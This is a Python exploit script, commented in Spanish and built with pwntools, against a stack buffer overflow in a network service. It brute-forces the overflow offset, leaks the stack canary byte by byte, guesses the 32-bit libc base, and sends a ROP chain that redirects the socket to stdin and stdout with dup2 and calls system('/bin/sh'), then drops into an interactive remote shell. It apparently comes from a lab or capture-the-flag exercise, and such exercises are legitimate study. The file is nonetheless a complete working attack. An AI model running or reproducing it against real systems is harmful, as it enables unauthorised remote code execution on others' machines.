import struct
import time
import socket
import sys
import argparse
from pwn import *

# ================== PARÁMETROS VARIABLES ==================

DEFAULT_PORT = 9999
DEFAULT_HOST = "localhost"
DEFAULT_LIBC_BASE_START = 0xf7c00000
DEFAULT_LIBC_BASE_END = 0xf7e00000
DEFAULT_PAGE_SIZE = 0x1000
DEFAULT_GADGET1_OFFSET = 0x000238a3 # Se debe ajustar por entorno
DEFAULT_GADGET2_OFFSET = 0x0019ef7b # Se debe ajustar por entorno
DEFAULT_LIBC_PATH = "/usr/lib32/libc.so.6" # Ruta por defecto de libc en sistemas de 32 bits

parser = argparse.ArgumentParser(description="Exploit automatizado para buffer overflow con canary y libc.")
parser.add_argument("--host", default="localhost", help="Host objetivo (default: localhost)")
parser.add_argument("--port", type=int, default=DEFAULT_PORT, help="Puerto objetivo (default: 9999)")
parser.add_argument("--libc", default=DEFAULT_LIBC_PATH, help="Ruta a la libc (default: /usr/lib32/libc.so.6)")
parser.add_argument("--libc-base-start", type=lambda x: int(x,0), default=DEFAULT_LIBC_BASE_START, help="Inicio del rango base de libc (default: 0xf7d00000)")
parser.add_argument("--libc-base-end", type=lambda x: int(x,0), default=DEFAULT_LIBC_BASE_END, help="Fin del rango base de libc (default: 0xf7e00000)")
parser.add_argument("--page-size", type=lambda x: int(x,0), default=DEFAULT_PAGE_SIZE, help="Tamaño de página (default: 0x1000)")
parser.add_argument("--gadget1-offset", type=lambda x: int(x,0), default=DEFAULT_GADGET1_OFFSET, help="Offset del primer gadget (default: 0x000238a3)")
parser.add_argument("--gadget2-offset", type=lambda x: int(x,0), default=DEFAULT_GADGET2_OFFSET, help="Offset del segundo gadget (default: 0x0019ef7b)")
parser.add_argument("--known-canary", type=lambda x: int(x,0), default=None, help="Valor conocido del canario (opcional)")
args = parser.parse_args()

HOST = args.host
PORT = args.port
LIBC_PATH = args.libc
LIBC_BASE_START = args.libc_base_start
LIBC_BASE_END = args.libc_base_end
PAGE_SIZE = args.page_size
GADGET1_OFFSET = args.gadget1_offset
GADGET2_OFFSET = args.gadget2_offset
known_canary = args.known_canary

# ================== FUNCIONES ==================
def generar_direcciones_libc(base_start=LIBC_BASE_START, base_end=LIBC_BASE_END, page_size=PAGE_SIZE):
    return [addr for addr in range(base_start, base_end, page_size)]

def get_connection():
    s = socket.socket()
    s.connect((HOST, PORT))
    return s

def interactive_shell(s):
    sys.stdout.flush()
    s.settimeout(0.5)
    s.send("echo 'pwnd by alarto ^o^'\n".encode())
    s.send("whoami\n".encode())
    sys.stdout.write(s.recv(4096).decode(errors='ignore'))
    while True:
        try:
            sys.stdout.flush()
            c = input("$-> ")
            s.send((c + '\n').encode())
            time.sleep(0.2)
            sys.stdout.write(s.recv(4096).decode(errors='ignore'))
        except socket.timeout:
            continue
        except KeyboardInterrupt:
            print("quit")
            s.close()
            break

def send_payload(payload_data: bytes, timeout=0.001):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)  # timeout muy corto para no quedarnos esperando
    try:
        s.connect((HOST, PORT))
        s.sendall(payload_data)
        try:
            response = s.recv(2048)
            # Si recv devuelve 0 bytes, socket cerrado por el servidor
            if len(response) == 0:
                # Cierre detectado rápido
                s.close()
                return False
            s.close()
            return True
        except socket.timeout:
            # Timeout en recv -> considerar que no hay respuesta y seguir
            s.close()
            return False
        except (ConnectionResetError, BrokenPipeError):
            s.close()
            return False
    except (socket.timeout, ConnectionRefusedError):
        # Timeout en connect o conexión rechazada
        s.close()
        return False
    except socket.error:
        s.close()
        return False

def calcular_offset():
    i = 20
    while True:
        payload = b"A" * i
        if not send_payload(payload, timeout=0.1):
            print(f"[+] GOT IT: offset = {i-1}")
            return i-1
        i += 1
        if i > 300:
            print("[-] Offset no encontrado en rango esperado")
            sys.exit(-1)

def byte_for_byte(payload, len_payload=8):
    p = payload
    start = len(p)
    stop = len(p) + len_payload
    while len(p) < stop:
        for i in range(256):
            attempt = p + bytes([i])
            try:
                s = get_connection()
                s.settimeout(0.01)
                s.send(attempt)
                response = s.recv(4096)
                if response:
                    p = attempt
                    print(f"[+] Byte found 0x{i:02x}")
                    break
            except socket.timeout:
                continue
            finally:
                s.close()
            if i == 255:
                print("[-] No se encontró byte en rango 0-255")
                sys.exit(-1)
    return p[-len_payload:]


# ================== EXPLOIT ==================
# 1. Descubre el offset hasta el canario
offset = calcular_offset()

# 2. Descubre el valor del canario (o usa el proporcionado)
canary = struct.pack(">I", known_canary) if known_canary else byte_for_byte(b"A" * offset, 4)
print(f"[+] Canary: 0x{canary.hex()}")

padding = b"B" * 12  # Padding hasta el return address

# 3. Carga libc y obtiene offsets de funciones y cadenas útiles
libc = ELF(LIBC_PATH, checksec=False)
system_offset = libc.symbols["system"]
exit_offset = libc.symbols["exit"]
ls_command_offset = next(libc.search(b"/etc/shells")) + 0x9  # Offset a la cadena de comando
binsh_offset = next(libc.search(b"/bin/sh"))
dup2_offset = libc.symbols["dup2"]

# 4. Genera posibles direcciones base de libc para intentar el exploit
libc_base_guesses = generar_direcciones_libc()

# 5. Prueba cada base de libc hasta obtener shell
for base in libc_base_guesses:
    # Calcula direcciones absolutas de funciones/gadgets para esta base
    system = struct.pack("<I", (base + system_offset))
    exit_addr = struct.pack("<I", (base + exit_offset))
    ls_cmd = struct.pack("<I", (base + ls_command_offset))
    dup2_cmd = struct.pack("<I", (base + dup2_offset))
    binsh = struct.pack("<I", (base + binsh_offset))
    gadget1 = struct.pack("<I", (base + GADGET1_OFFSET))
    gadget2 = struct.pack("<I", (base + GADGET2_OFFSET))

    # Construye el payload para esta base
    PAYLOAD = b"A" * offset
    PAYLOAD += canary
    PAYLOAD += padding  # Padding hasta el return address
    # Redirige stdin, stdout, stderr al socket (fd=4)
    PAYLOAD += dup2_cmd + gadget2 + p32(4) + p32(0)
    PAYLOAD += dup2_cmd + gadget2 + p32(4) + p32(1)
    PAYLOAD += dup2_cmd + gadget2 + p32(4) + p32(2)
    # Ejecuta system("/etc/shells") para comprobar si hay éxito
    PAYLOAD += system + gadget1 + ls_cmd
    # Ejecuta system("/bin/sh") para obtener shell interactiva
    PAYLOAD += system + exit_addr + binsh

    try:
        s = get_connection()
        s.settimeout(0.01)
        s.send(PAYLOAD)
        response = s.recv(4096)
        if response:
            s.settimeout(None)
            print("[+] Shell!")
            interactive_shell(s)
            break
        else:
            s.close()
    except socket.timeout:
        continue

print("[!] No se obtuvo shell")